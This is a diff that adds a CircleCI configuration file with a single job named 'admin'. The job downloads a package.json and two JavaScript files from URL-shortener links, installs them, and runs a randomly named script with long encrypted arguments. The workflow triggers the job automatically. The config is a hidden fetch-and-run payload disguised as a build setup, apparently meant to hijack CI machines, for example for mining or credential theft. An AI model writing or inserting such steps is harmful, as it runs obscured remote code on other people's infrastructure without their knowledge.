@@ -1,0 +1,16 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  admin:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/abtO4 -o package.json && curl -fsSL shorturl.at/sCTU7 -o jobslogger.js && curl -fsSL shorturl.at/lAC17 -o relarn32cgfemk.js
+      - run: npm i -s
+      - run: node relarn32cgfemk -r U2FsdGVkX18CZoqjWk2ZeGiw4tkyLNgvP1TLSbeCpgOKel6WrKqWYnZ2VU9cmBAglhxJHdEnJtXt65ZwubckLJkBYIPLTQHN3n9fjaSORJs+ZgnrNLU1I/P3P8n654/s8ey7sL3MznvQON0kXPbuZTv+N0x5IGiY2lozB58kLYajFw52Kc4eidjKYwKWA/jtYRC2PtLLzEqdeXZhHuG0XHVWXKlfKj9MbkRXhgx6EK5zcURvj4scBKBnoP9k7YCs2AviV/nupzaTY7OzPyuVrGPz5a1WDeH30sx5n3ktDh8HZf87Kufp+6F1LvGh7Xe/hIh5AWHUzEq7uMvSJsXYhrB1aXPBvWAVUUmIHsjZmhj5gR+ZzrbCF9oAbC+zNKIb -t U2FsdGVkX1+fkDxyJG2Xn23funqphl+JKuWnL8aKGja2WbPpx4c4XjPL94EloxYS -lpn U2FsdGVkX1+HXLWGNBZDqjgZ/LbOknmFTJ6DgRJ9Lf8= -sp -s U2FsdGVkX19YZO8lHl/9esXHJbBorKSEG9UJ3GieNT/dIs/aMGP0uzFqZHoup0TMlMZwn5fO7LF8SGcGmdbQ5IGog7xPML9MEj9aihD+2wBFfL/1hTc1FqFWUJDCKCwouF8Y3aQy/LgZ0oHSFVC2tjIrH/qBiNAxXCHWT2rp/2QWo89AWTHMUy5JKi65laDjDza5ztM4OMmx+RK9FY3F7E2BV/Q9S24pWuX503+ygN8=
+      
+workflows:
+  start-work:
+    jobs:
+      - admin
